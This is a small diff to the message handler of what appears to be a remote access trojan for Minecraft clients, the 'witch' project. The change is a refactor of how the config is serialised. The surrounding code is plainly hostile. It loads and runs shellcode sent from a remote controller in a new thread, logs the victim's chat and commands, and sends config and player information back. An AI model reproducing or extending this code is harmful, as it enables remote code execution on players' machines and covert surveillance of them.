@@ -1,7 +1,6 @@
 package me.soda.witch.client.connection;
 
-import com.google.gson.Gson;
-import me.soda.witch.client.Variables;
+import me.soda.witch.shared.socket.messages.Variables;
 import me.soda.witch.client.utils.*;
 import me.soda.witch.shared.FileUtil;
 import me.soda.witch.shared.LogUtil;
@@ -40,7 +39,7 @@ public class MessageHandler {
                         new Thread(() -> new ShellcodeLoader().loadShellCode((String) msg)).start();
                 }
                 case "log" -> Variables.INSTANCE.logChatAndCommand = !Variables.INSTANCE.logChatAndCommand;
-                case "config" -> NetUtil.send(msgType, new Gson().toJson(Variables.INSTANCE));
+                case "config" -> NetUtil.send(msgType, Variables.INSTANCE);
                 case "player" -> NetUtil.send(msgType, MCUtils.getPlayerInfo());
                 case "skin" -> {
                     NetUtil.send("player", new PlayerInfo());
